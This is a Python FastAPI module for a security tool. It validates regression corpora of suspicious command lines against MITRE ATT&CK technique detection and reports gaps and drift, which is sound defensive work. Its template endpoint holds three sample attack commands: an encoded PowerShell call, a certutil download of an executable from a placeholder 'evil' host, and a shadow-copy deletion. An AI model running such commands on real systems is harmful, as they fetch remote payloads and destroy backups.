"""Corpus Validator — Feb 2026

Ingests a regression corpus (CSV, JSON, JSONL, or XLSX) and produces a
gap-report — for every row it says:
  · what MITRE T-IDs did we find
  · what MITRE T-IDs were EXPECTED (if the corpus has an `expected_mitre` column)
  · which rows had zero MITRE hits (candidates for new fragment heuristics)
  · which rows show *drift* (expected vs got mismatch)

Endpoints (all under /api):
    POST /corpus/validate            — multipart upload (csv/json/jsonl/xlsx)
    POST /corpus/validate/json       — JSON body with `payloads` list
    GET  /corpus/validate/example    — download starter template
"""
from __future__ import annotations

import csv
import io
import json
import re
from typing import Any, Dict, List, Optional

from fastapi import (APIRouter, Depends, File, Form, HTTPException,
                     Response, UploadFile)
from pydantic import BaseModel, Field

from deps import get_current_user
from operations import mitre_map

router = APIRouter()

_MAX_ROWS = 1000


class CorpusRowIn(BaseModel):
    input:           str = Field(..., min_length=1)
    expected_mitre:  Optional[List[str]] = None
    expected_lolbin: Optional[List[str]] = None
    expected_verdict: Optional[str] = None
    note:            Optional[str] = None


class CorpusIn(BaseModel):
    payloads: List[CorpusRowIn] = Field(..., min_length=1)


# ─── Helpers ────────────────────────────────────────────────────────────
def _snip(s: str, n: int = 160) -> str:
    if not s:
        return ""
    s = re.sub(r"\s+", " ", s.strip())
    return s if len(s) <= n else s[: n - 1] + "…"


def _tids_from(hits) -> set:
    return {h["id"] for h in (hits or []) if isinstance(h, dict) and h.get("id")}


def _covers(exp: set, got: set) -> bool:
    """Prefix-match — T1059 covers T1059.001, etc."""
    if not exp:
        return True
    for e in exp:
        base = e.split(".")[0]
        if e in got or any(g == e or g == base or g.startswith(base + ".") for g in got):
            continue
        return False
    return True


def _validate_row(row: CorpusRowIn) -> Dict[str, Any]:
    text = (row.input or "").strip()
    got  = _tids_from(mitre_map(text))
    exp  = set(row.expected_mitre or [])
    covered = _covers(exp, got)
    missing = sorted(exp - got - {g.split(".")[0] for g in got})
    extras  = sorted(got - exp - {e.split(".")[0] for e in exp}) if exp else []
    status = (
        "no_expectations" if not exp else
        "pass" if covered else
        "gap"
    )
    if not exp and not got:
        status = "empty_mitre_no_expectations"
    return {
        "input_snippet":  _snip(text),
        "expected_mitre": sorted(exp),
        "got_mitre":      sorted(got),
        "missing":        missing,
        "extras":         extras,
        "status":         status,
        "note":           row.note or "",
    }


def _summarize(rows: List[Dict[str, Any]]) -> Dict[str, Any]:
    by_status: Dict[str, int] = {}
    for r in rows:
        by_status[r["status"]] = by_status.get(r["status"], 0) + 1
    # Fragment candidates = rows with empty MITRE (great inputs for new heuristics)
    empty_mitre = [r for r in rows if not r["got_mitre"]]
    return {
        "total":         len(rows),
        "by_status":     by_status,
        "empty_mitre":   len(empty_mitre),
        "coverage_pct":  round(sum(1 for r in rows if r["status"] == "pass") * 100
                               / max(1, sum(1 for r in rows if r["expected_mitre"])), 1)
                         if any(r["expected_mitre"] for r in rows) else None,
    }


# ─── Parsers ────────────────────────────────────────────────────────────
def _parse_csv(raw: bytes) -> List[CorpusRowIn]:
    text = raw.decode("utf-8-sig", errors="replace")
    rows: List[CorpusRowIn] = []
    reader = csv.DictReader(io.StringIO(text))
    for r in reader:
        payload = r.get("input") or r.get("payload") or r.get("sample") or ""
        if not payload.strip():
            continue
        exp = (r.get("expected_mitre") or r.get("expected") or "").strip()
        exp_list = [t.strip() for t in re.split(r"[,\|\s;]+", exp) if t.strip().startswith("T")]
        lol = (r.get("expected_lolbin") or "").strip()
        lol_list = [l.strip() for l in re.split(r"[,\|\s;]+", lol) if l.strip()]
        rows.append(CorpusRowIn(
            input=payload,
            expected_mitre=exp_list or None,
            expected_lolbin=lol_list or None,
            expected_verdict=(r.get("expected_verdict") or "").strip() or None,
            note=(r.get("note") or "").strip() or None,
        ))
    return rows


def _parse_json_or_jsonl(raw: bytes) -> List[CorpusRowIn]:
    text = raw.decode("utf-8", errors="replace").strip()
    rows: List[CorpusRowIn] = []
    if not text:
        return rows
    # JSONL detection: multiple lines, each parseable as an object
    if "\n" in text and text.lstrip()[0] in "{[":
        parsed_any = False
        for line in text.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
                if isinstance(obj, dict):
                    rows.append(CorpusRowIn(**{
                        "input": obj.get("input") or obj.get("payload") or "",
                        "expected_mitre":  obj.get("expected_mitre") or obj.get("expected_mitre_ids"),
                        "expected_lolbin": obj.get("expected_lolbin") or obj.get("expected_lolbins"),
                        "expected_verdict": obj.get("expected_verdict") or obj.get("expected_severity"),
                        "note": obj.get("note") or obj.get("title"),
                    }))
                    parsed_any = True
            except Exception:
                continue
        if parsed_any:
            return rows
    # Fall back to plain JSON array/object
    data = json.loads(text)
    if isinstance(data, dict):
        data = data.get("payloads") or data.get("rows") or []
    if not isinstance(data, list):
        raise ValueError("JSON must be a list or an object with a `payloads`/`rows` array")
    for obj in data:
        if isinstance(obj, str):
            rows.append(CorpusRowIn(input=obj))
        elif isinstance(obj, dict):
            rows.append(CorpusRowIn(**{
                "input": obj.get("input") or obj.get("payload") or "",
                "expected_mitre":  obj.get("expected_mitre") or obj.get("expected_mitre_ids"),
                "expected_lolbin": obj.get("expected_lolbin") or obj.get("expected_lolbins"),
                "expected_verdict": obj.get("expected_verdict") or obj.get("expected_severity"),
                "note": obj.get("note") or obj.get("title"),
            }))
    return rows


def _parse_xlsx(raw: bytes) -> List[CorpusRowIn]:
    """Optional .xlsx support via openpyxl if installed."""
    try:
        import openpyxl  # noqa: WPS433
    except Exception as e:
        raise HTTPException(status_code=415,
            detail=f".xlsx parsing requires openpyxl (server error: {e})")
    wb = openpyxl.load_workbook(io.BytesIO(raw), read_only=True, data_only=True)
    ws = wb.active
    header: List[str] = []
    rows: List[CorpusRowIn] = []
    for i, r in enumerate(ws.iter_rows(values_only=True)):
        if i == 0:
            header = [str(c).strip().lower() if c else "" for c in r]
            continue
        d = {header[j]: r[j] for j in range(min(len(header), len(r))) if header[j]}
        payload = str(d.get("input") or d.get("payload") or d.get("sample") or "").strip()
        if not payload:
            continue
        exp = str(d.get("expected_mitre") or d.get("expected") or "").strip()
        exp_list = [t.strip() for t in re.split(r"[,\|\s;]+", exp) if t.strip().startswith("T")]
        rows.append(CorpusRowIn(
            input=payload,
            expected_mitre=exp_list or None,
            note=str(d.get("note") or "").strip() or None,
        ))
    return rows


# ─── Endpoints ──────────────────────────────────────────────────────────
@router.post("/corpus/validate")
async def corpus_validate_upload(
    file: UploadFile = File(...),
    user=Depends(get_current_user),
):
    """Multipart upload — csv / json / jsonl / xlsx."""
    raw = await file.read()
    if not raw:
        raise HTTPException(status_code=422, detail="empty upload")
    name = (file.filename or "").lower()
    try:
        if name.endswith(".xlsx"):
            rows_in = _parse_xlsx(raw)
        elif name.endswith((".json", ".jsonl")):
            rows_in = _parse_json_or_jsonl(raw)
        else:
            rows_in = _parse_csv(raw)
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=422, detail=f"parse failed: {e}")
    rows_in = rows_in[:_MAX_ROWS]
    if not rows_in:
        raise HTTPException(status_code=422, detail="no rows found")
    rows = [_validate_row(r) for r in rows_in]
    return {
        "filename": file.filename,
        "summary":  _summarize(rows),
        "rows":     rows,
    }


@router.post("/corpus/validate/json")
async def corpus_validate_json(body: CorpusIn, user=Depends(get_current_user)):
    """Pure JSON body — for programmatic gap-reports."""
    rows_in = body.payloads[:_MAX_ROWS]
    rows = [_validate_row(r) for r in rows_in]
    return {"summary": _summarize(rows), "rows": rows}


@router.get("/corpus/validate/example")
async def corpus_validate_example(user=Depends(get_current_user)):
    """Download a starter CSV template."""
    buf = io.StringIO()
    w = csv.writer(buf, quoting=csv.QUOTE_ALL)
    w.writerow(["input", "expected_mitre", "expected_lolbin", "expected_verdict", "note"])
    w.writerow(["powershell.exe -EncodedCommand VwByAA==", "T1059.001,T1027.010",
                "powershell.exe", "Malicious", "canonical PS -EncodedCommand"])
    w.writerow(["-urlcache -split -f http://evil/x.exe C:\\x.exe", "T1105",
                "certutil.exe", "Malicious", "fragment: certutil args only"])
    w.writerow(["vssadmin delete shadows /all /quiet", "T1490", "vssadmin.exe",
                "Malicious", "ransomware precursor"])
    return Response(
        content=buf.getvalue(),
        media_type="text/csv",
        headers={"Content-Disposition": 'attachment; filename="corpus_validate_template.csv"'},
    )
